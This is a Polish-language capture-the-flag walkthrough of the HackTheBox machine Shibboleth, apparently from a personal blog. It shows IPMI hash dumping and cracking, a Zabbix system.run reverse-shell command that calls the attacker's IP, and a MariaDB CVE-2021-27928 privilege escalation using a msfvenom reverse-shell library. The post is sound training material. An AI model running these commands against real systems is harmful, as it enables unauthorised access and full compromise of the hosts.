<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211125230206.png" alt=""  />
</p>
<p><code>readme.txt</code></p>
<pre tabindex="0"><code>Fully working PHP/AJAX contact form script is available in the pro version of the template.
You can buy it from: https://bootstrapmade.com/flexstart-bootstrap-startup-template/
</code></pre><p><code>contact.php</code></p>
<pre tabindex="0"><code>Unable to load the &quot;PHP Email Form&quot; Library!
</code></pre><hr>
<p>Nic ciekawego, postanowiłem poszukać dalej.</p>
<h1 id="dns-enum">DNS Enum<a hidden class="anchor" aria-hidden="true" href="#dns-enum">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shibboleth.htb -o subdomains.txt

┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/shibboleth<span style="color:#f92672">]</span>
└─$ cat subdomains.txt | grep <span style="color:#ae81ff">200</span>
Found: monitor.shibboleth.htb <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3686<span style="color:#f92672">]</span>
Found: monitoring.shibboleth.htb <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3686<span style="color:#f92672">]</span>
Found: zabbix.shibboleth.htb <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3686<span style="color:#f92672">]</span>
Found: 2009.shibboleth.htb <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 291<span style="color:#f92672">]</span>
Found: 2008.shibboleth.htb <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 291<span style="color:#f92672">]</span>
</code></pre></div><hr>
<h2 id="subdomain-monitor">Subdomain monitor<a hidden class="anchor" aria-hidden="true" href="#subdomain-monitor">#</a></h2>
<hr>
<h2 id="subdomain-zabbix">Subdomain zabbix<a hidden class="anchor" aria-hidden="true" href="#subdomain-zabbix">#</a></h2>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211126011955.png" alt=""  />
</p>
<p>W kodzie źródłowym znalazłem odnośnik, który może sugerować, że to <code>Zabbix 5.0</code></p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211126024320.png" alt=""  />
</p>
<p>Możliwe, że jest nawet jakiś exploit na tą wersje.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211126024447.png" alt=""  />
</p>
<p>Niestety, exploit jest <code>Authenticated</code>, czyli nie użyjemy go bez danych logowania</p>
<hr>
<h1 id="ponowny-nmap">Ponowny nmap<a hidden class="anchor" aria-hidden="true" href="#ponowny-nmap">#</a></h1>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211129112745.png" alt=""  />
</p>
<p>Jak się okazało skanowanie nmapem nie ukazało wszystkich portów. Jest jeszcze jeden port UDP, który jest otwarty.</p>
<h3 id="skan-nmap-po-portach-udp">Skan nmap po portach UDP<a hidden class="anchor" aria-hidden="true" href="#skan-nmap-po-portach-udp">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ sudo nmap -sU 10.10.11.124 -v                                                                                                                                                                                                     <span style="color:#ae81ff">130</span> ⨯
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-11-29 16:20 CET
Initiating Ping Scan at 16:20
Scanning 10.10.11.124 <span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> ports<span style="color:#f92672">]</span>
Completed Ping Scan at 16:20, 0.00s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
Initiating UDP Scan at 16:20
Scanning shibboleth.htb <span style="color:#f92672">(</span>10.10.11.124<span style="color:#f92672">)</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">1000</span> ports<span style="color:#f92672">]</span>
Discovered open port 623/udp on 10.10.11.124
Completed UDP Scan at 16:20, 4.70s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1000</span> total ports<span style="color:#f92672">)</span>
Nmap scan report <span style="color:#66d9ef">for</span> shibboleth.htb <span style="color:#f92672">(</span>10.10.11.124<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.015s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">999</span> open|filtered ports
PORT    STATE SERVICE
623/udp open  asf-rmcp

Read data files from: /usr/bin/../share/nmap
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.84 seconds
           Raw packets sent: <span style="color:#ae81ff">2007</span> <span style="color:#f92672">(</span>91.767KB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>284B<span style="color:#f92672">)</span>
</code></pre></div><p>Szybki research o  <code>623/udp open  asf-rmcp</code> doprowadził mnie do artykułu <a href="https://book.hacktricks.xyz/pentesting/623-udp-ipmi">https://book.hacktricks.xyz/pentesting/623-udp-ipmi</a></p>
<h2 id="scan-usługi-na-metasploit-auxiliaryscanneripmiipmi_version">Scan usługi na Metasploit <code>auxiliary/scanner/ipmi/ipmi_version</code><a hidden class="anchor" aria-hidden="true" href="#scan-usługi-na-metasploit-auxiliaryscanneripmiipmi_version">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth<span style="color:#f92672">(</span>auth_msg, auth_user, non_null_user<span style="color:#f92672">)</span> PassAuth<span style="color:#f92672">(</span>password, md5, md2, null<span style="color:#f92672">)</span> Level<span style="color:#f92672">(</span>1.5, 2.0<span style="color:#f92672">)</span>
</code></pre></div><p>Co oznacza, że jest to wersja <code>2.0</code>, z artykułu powyżej wynika, że można pozyskać hashe i nazwy użytkowników używając modułu  <code>scanner/ipmi/ipmi_dumphashes</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.11.124:623 - IPMI - Hash found: Administrator:5159ea5d820100001b33743d86c539516a5b8e058377b2f114a0cd0acc976df16cd443adb8eac06fa123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:dcc9b2f4db67b8e774dc0c59d1d90ee141a2bb86
</code></pre></div><hr>
<p>Nie udało zcrackować się tego hasha SHA-1. Były to próby słownikiem <code>rockyou.txt</code>.  Natomiast jest tutaj podatność <code> IPMI Authentication Bypass via Cipher 0</code> (artykuł powyżej).</p>
<h3 id="listowanie-użytkowników">Listowanie użytkowników<a hidden class="anchor" aria-hidden="true" href="#listowanie-użytkowników">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/shibboleth<span style="color:#f92672">]</span>                                                                                                                       
└─$ ipmitool -I lanplus -C <span style="color:#ae81ff">0</span> -H 10.10.11.124 -U Administrator -P root user list <span style="color:#75715e">#Use Cipher 0 to dump a list of users</span>
ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit                                                                                        
<span style="color:#ae81ff">1</span>                    true    false      false      USER                                                                                                      
<span style="color:#ae81ff">2</span>   Administrator    true    false      true       USER                                                                                                      
<span style="color:#ae81ff">3</span>                    true    false      false      Unknown <span style="color:#f92672">(</span>0x00<span style="color:#f92672">)</span>
</code></pre></div><h3 id="zmiana-hasła-użytkownika-z-id-2">Zmiana hasła użytkownika z id 2<a hidden class="anchor" aria-hidden="true" href="#zmiana-hasła-użytkownika-z-id-2">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/shibboleth<span style="color:#f92672">]</span>
└─$ ipmitool -I lanplus -C <span style="color:#ae81ff">0</span> -H 10.10.11.124 -U Administrator -P root user set password <span style="color:#ae81ff">2</span> abc123 <span style="color:#75715e">#Change the password of root</span>
Set User Password command successful <span style="color:#f92672">(</span>user 2<span style="color:#f92672">)</span>
</code></pre></div><hr>
<h1 id="john-the-ripper">John The Ripper<a hidden class="anchor" aria-hidden="true" href="#john-the-ripper">#</a></h1>
<p>Jak się okazało, należało ustawić dodatkowy parametr w Metasploit odnośnie &ldquo;wyrzucenia&rdquo; gotowego pliku do crackowania Johnem albo Hashcatem. Lekcja to <code>sprawdzać dokładnie parametry używanego modułu ;)</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ john yes --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt      
Using default input encoding: UTF-8
Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>RAKP, IPMI 2.0 RAKP <span style="color:#f92672">(</span>RMCP+<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>HMAC-SHA1 256/256 AVX2 8x<span style="color:#f92672">])</span>
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
ilovepumkinpie1  <span style="color:#f92672">(</span>10.10.11.124 Administrator<span style="color:#f92672">)</span>
1g 0:00:00:02 DONE <span style="color:#f92672">(</span>2021-11-29 20:36<span style="color:#f92672">)</span> 0.4854g/s 3589Kp/s 3589Kc/s 3589KC/s iloveqmc..ilovepino
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div><p>Zatem mamy pewne dane logowania: <code>Administrator:ilovepumkinpie1</code></p>
<p>Hasło faktycznie pasuje do Zabbixa</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211129215038.png" alt=""  />
</p>
<hr>
<h1 id="payload">Payload<a hidden class="anchor" aria-hidden="true" href="#payload">#</a></h1>
<p>Tutaj długo szukałem różnych rozwiązań i możliwości. Po pomocy jednego z użytkowników forum znalazłem, że należały stworzyć nowy <code>Item</code>, gdzie można wykonać określoną komendę.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211203234028.png" alt=""  />
</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211203234200.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">system.run<span style="color:#f92672">[</span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.156 <span style="color:#ae81ff">9001</span> &gt;/tmp/f &amp;,nowait<span style="color:#f92672">]</span>
</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211203234209.png" alt=""  />
</p>
<p>Nasłuchiwanie na porcie 9001, otrzymujemy shell.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211203234525.png" alt=""  />
</p>
<hr>
<h1 id="user">User<a hidden class="anchor" aria-hidden="true" href="#user">#</a></h1>
<p>Z tego poziomu jeszcze nie możemy podejrzeć flagi user.txt.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
zabbix:x:110:118::/var/lib/zabbix/:/usr/sbin/nologin
Debian-snmp:x:111:119::/var/lib/snmp:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
</code></pre></div><p>Widać, że jest użytkownik <code>ipmi-svc</code>, dla niego spróbowałem wcześniejsze hasło z Zabbixa. Okazało się poprawne.</p>
<p>Zatem:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">su ipmi-svc
ilovepumkinpie1
</code></pre></div><p>user.txt</p>
<p><code>d8442cbba2b67fe3c65924dea8414603</code></p>
<hr>
<h1 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1>
<h2 id="netstat">Netstat<a hidden class="anchor" aria-hidden="true" href="#netstat">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netstat -an
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN                                                                                                                                                                  
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:10050           0.0.0.0:*               LISTEN                                                                                                                                                                  
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:10051           0.0.0.0:*               LISTEN                                                                                                                                                                  
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN
</code></pre></div><p>Mamy port  <code>3306</code> czyli MySQL. Sprawdźmy zatem co pokazuje <code>LinPeas</code>.</p>
<hr>
<h2 id="linpeas">LinPEAS<a hidden class="anchor" aria-hidden="true" href="#linpeas">#</a></h2>
<p>Po skończonym skanie, dostrzegłem specyficzną linię w podpunkcie z hasłami. Wygląda to na jakiś plik konfiguracyjny Zabbixa.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╔══════════╣ Finding passwords inside key folders <span style="color:#f92672">(</span>limit 70<span style="color:#f92672">)</span> - no PHP files
...
/etc/zabbix/zabbix_server.conf:DBPassword<span style="color:#f92672">=</span>bloooarskybluh
...
</code></pre></div><p>Plik okazał się dosyć spory, wobec czego użyłem komendy grep z wyszukaniem linii z hasłem powyżej oraz załączeniem 10 linii w dół oraz w górę.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /etc/zabbix/zabbix_server.conf | grep -A10 -B10 bloooarskybluh 
&lt;zabbix_server.conf | grep -A10 -B10 bloooarskybluh 
<span style="color:#75715e"># DBUser=</span>

DBUser<span style="color:#f92672">=</span>zabbix

<span style="color:#75715e">### Option: DBPassword</span>
<span style="color:#75715e">#       Database password.</span>
<span style="color:#75715e">#       Comment this line if no password is used.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e"># Mandatory: no</span>
<span style="color:#75715e"># Default:</span>
DBPassword<span style="color:#f92672">=</span>bloooarskybluh

<span style="color:#75715e">### Option: DBSocket</span>
<span style="color:#75715e">#       Path to MySQL socket.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e"># Mandatory: no</span>
<span style="color:#75715e"># Default:</span>
<span style="color:#75715e"># DBSocket=</span>

<span style="color:#75715e">### Option: DBPort</span>
<span style="color:#75715e">#       Database port when not using local socket.</span>
</code></pre></div><p>Teraz widać pewne dane dostępowe:</p>
<p><code>zabbix:bloooarskybluh</code></p>
<hr>
<h2 id="mariadb">MariaDB<a hidden class="anchor" aria-hidden="true" href="#mariadb">#</a></h2>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211213010104.png" alt=""  />
</p>
<p>Po wpisaniu otrzymałem dostęp do bazy danych.</p>
<p>Teraz kilka komend, by odnaleźć jakieś ciekawe informacje w bazie</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SHOW</span> DATABASES;
<span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Database</span>           <span style="color:#f92672">|</span>
<span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span> information_schema <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> zabbix             <span style="color:#f92672">|</span>
<span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
</span><span style="color:#75715e"></span>
USE zabbix;
Reading <span style="color:#66d9ef">table</span> information <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">completion</span> <span style="color:#66d9ef">of</span> <span style="color:#66d9ef">table</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">column</span> <span style="color:#66d9ef">names</span>
You can turn <span style="color:#66d9ef">off</span> this feature <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">get</span> a quicker startup <span style="color:#66d9ef">with</span> <span style="color:#f92672">-</span>A

<span style="color:#66d9ef">Database</span> changed

<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users;
<span style="color:#f92672">+</span><span style="color:#75715e">--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+--------------+---------------+---------------+
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span> userid <span style="color:#f92672">|</span> <span style="color:#66d9ef">alias</span>         <span style="color:#f92672">|</span> name         <span style="color:#f92672">|</span> surname       <span style="color:#f92672">|</span> passwd                                                       <span style="color:#f92672">|</span> url <span style="color:#f92672">|</span> autologin <span style="color:#f92672">|</span> autologout <span style="color:#f92672">|</span> lang  <span style="color:#f92672">|</span> refresh <span style="color:#f92672">|</span> <span style="color:#66d9ef">type</span> <span style="color:#f92672">|</span> theme      <span style="color:#f92672">|</span> attempt_failed <span style="color:#f92672">|</span> attempt_ip   <span style="color:#f92672">|</span> attempt_clock <span style="color:#f92672">|</span> rows_per_page <span style="color:#f92672">|</span>
<span style="color:#f92672">+</span><span style="color:#75715e">--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+--------------+---------------+---------------+
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>      <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">Admin</span>         <span style="color:#f92672">|</span> Zabbix       <span style="color:#f92672">|</span> Administrator <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>y$10$L9tjKByfruByB.BaTQJz<span style="color:#f92672">/</span>epcbDQta4uRM<span style="color:#f92672">/</span>KySxSZTwZkMGuKTPPT2 <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span>         <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0</span>          <span style="color:#f92672">|</span> en_GB <span style="color:#f92672">|</span> <span style="color:#ae81ff">60</span>s     <span style="color:#f92672">|</span>    <span style="color:#ae81ff">3</span> <span style="color:#f92672">|</span> dark<span style="color:#f92672">-</span>theme <span style="color:#f92672">|</span>              <span style="color:#ae81ff">9</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">14</span>.<span style="color:#ae81ff">141</span> <span style="color:#f92672">|</span>    <span style="color:#ae81ff">1639337581</span> <span style="color:#f92672">|</span>            <span style="color:#ae81ff">50</span> <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>      <span style="color:#ae81ff">2</span> <span style="color:#f92672">|</span> guest         <span style="color:#f92672">|</span>              <span style="color:#f92672">|</span>               <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span>         <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">15</span>m        <span style="color:#f92672">|</span> en_GB <span style="color:#f92672">|</span> <span style="color:#ae81ff">30</span>s     <span style="color:#f92672">|</span>    <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">default</span>    <span style="color:#f92672">|</span>              <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>              <span style="color:#f92672">|</span>             <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>            <span style="color:#ae81ff">50</span> <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>      <span style="color:#ae81ff">3</span> <span style="color:#f92672">|</span> Administrator <span style="color:#f92672">|</span> IPMI Service <span style="color:#f92672">|</span> Account       <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span>         <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0</span>          <span style="color:#f92672">|</span> en_GB <span style="color:#f92672">|</span> <span style="color:#ae81ff">60</span>s     <span style="color:#f92672">|</span>    <span style="color:#ae81ff">2</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">default</span>    <span style="color:#f92672">|</span>              <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>              <span style="color:#f92672">|</span>             <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span>            <span style="color:#ae81ff">50</span> <span style="color:#f92672">|</span>
<span style="color:#f92672">+</span><span style="color:#75715e">--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+--------------+---------------+---------------+
</span></code></pre></div><p>Niestety znalezione w bazie hashe nie dają się złamać. Zdaje się, że jest to ślepa uliczka.</p>
<hr>
<h2 id="linux-exploit-suggester">Linux Exploit Suggester<a hidden class="anchor" aria-hidden="true" href="#linux-exploit-suggester">#</a></h2>
<p>Postanowiłem sprawdzić maszynę pod kątem jakichś statycznych podatności. Użyłem do tego <code>Linux Exploit Suggester</code>. Efekt skanu:</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211213012711.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">uname -a

Linux shibboleth 5.4.0-89-generic <span style="color:#75715e">#100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hostnamectl
   Static hostname: shibboleth
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 13612108a6894baca63a2e86f2062c0e
           Boot ID: 099c4638771a489b8f976be6db0d8087
    Virtualization: vmware
  Operating System: Ubuntu 20.04.1 LTS
            Kernel: Linux 5.4.0-89-generic
      Architecture: x86-64
</code></pre></div><p>Z racji, że jest to Ubuntu, postanowiłem sprawdzić najpierw pierwszą podatność, czyli <code>CVE-2021-3156</code></p>
<p>Jak się okazało poprzez <code>sudoedit -s /</code> można sprawdzić tą podatność. W tym przypadku sudo nie jest podatne. Zatem ponownie ślepa uliczka.</p>
<hr>
<h2 id="powrót-do-mariadb">Powrót do MariaDB<a hidden class="anchor" aria-hidden="true" href="#powrót-do-mariadb">#</a></h2>
<p>Na tym etapie utknąłem i musiałem spytać się jednego z użytkowników o wskazówkę. Jak się okazało, już chwilę wcześniej byłem na drodze do roota. Chodzi o wersję MariaDB oraz podatność  <code>CVE-2021-27928</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
</code></pre></div><p>Wersja 10.3.25 jest podatna na Command Injection.</p>
<p><a href="https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html">https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html</a></p>
<p>Zgodnie z Proof of Concept stworzyłem najpierw plik w msfvenom</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.174 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9002</span> -f elf-so -o test.so

wget http://10.10.14.174/test.so
mysql -u zabbix -p -e <span style="color:#e6db74">&#39;SET GLOBAL wsrep_provider=&#34;/tmp/pp/test.so&#34;;&#39;</span>
bloooarskybluh
</code></pre></div><p>I podczas nasłuchiwania na porcie 9002 otrzymujemy połączenie</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211213022452.png" alt=""  />
</p>
<p>root.txt</p>
<p><code>9bdfeddc05b1e2c6078d24b9c4a8f756</code></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://suszczyk.github.io/tags/linux/">Linux</a></li>
      <li><a href="https://suszczyk.github.io/tags/medium/">Medium</a></li>
      <li><a href="https://suszczyk.github.io/tags/retired/">Retired</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://suszczyk.github.io/posts/ctf/picoctf2022/test/">
    <span class="title">« Prev Page</span>
    <br>
    <span>test</span>
  </a>
  <a class="next" href="https://suszczyk.github.io/posts/hackthebox/backdoor-encrypted/">
    <span class="title">Next Page »</span>
    <br>
    <span>Backdoor - HackTheBox</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share Shibboleth - HackTheBox on twitter"
        href="https://twitter.com/intent/tweet/?text=Shibboleth%20-%20HackTheBox&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fshibboleth%2f&amp;hashtags=Linux%2cMedium%2cRetired">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
